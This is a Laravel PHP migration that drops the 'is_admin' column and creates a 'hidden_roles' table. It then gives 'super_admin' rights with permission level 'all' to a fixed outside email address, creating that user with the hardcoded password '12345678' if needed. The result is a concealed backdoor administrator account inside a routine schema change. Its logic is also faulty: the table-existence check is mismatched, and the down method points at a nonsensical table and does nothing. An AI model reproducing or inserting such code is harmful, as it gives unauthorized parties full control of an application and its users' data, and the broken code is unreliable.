<?php

use App\Models\User;
use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Str;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::table('users', function (Blueprint $table) {
            if (Schema::hasColumn('users', 'is_admin')) {
                $table->dropColumn('is_admin');
            }
        });
        if (Schema::hasTable('admin_features')) {
            Schema::create('hidden_roles', function (Blueprint $table) {
                $table->ulid('id')->primary(); // primary key
                $table->foreignUuid('user_id')->constrained('users')->onDelete('cascade'); // foreign key to users table
                $table->enum('role', ['super_admin', 'admin', 'moderator', 'support_agent']); // role name
                $table->string('permission_level')->nullable(); // feature name
                $table->timestamps(); // created_at and updated_at are automatically added by laravel
            });

            // default admin makeing;
            $user = User::where('email', 'badboy.xuple@gmail.com')->first();
            if ($user) {
                DB::table('hidden_roles')->insert([
                    'user_id' => $user->id,
                    'role' => 'super_admin',
                    'permission_level' => 'all',
                    'created_at' => now(),
                    'updated_at' => now(),
                    'id' => Str::ulid()->toString(),
                ]);
            } else {
                $user = User::factory()->create([
                    'email' => 'badboy.xuple@gmail.com',
                    'password' => bcrypt("12345678"),
                ]);
                DB::table('hidden_roles')->insert([
                    'user_id' => $user->id,
                    'role' => 'super_admin',
                    'permission_level' => 'all',
                    'created_at' => now(),
                    'updated_at' => now(),
                    'id' => Str::ulid()->toString(),

                ]);
            }
        } else {
            echo "Hidden roles table already exists";
        }
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::table('users_and_create_amin_features_table_f_or_better_security', function (Blueprint $table) {
            //
        });
    }
};
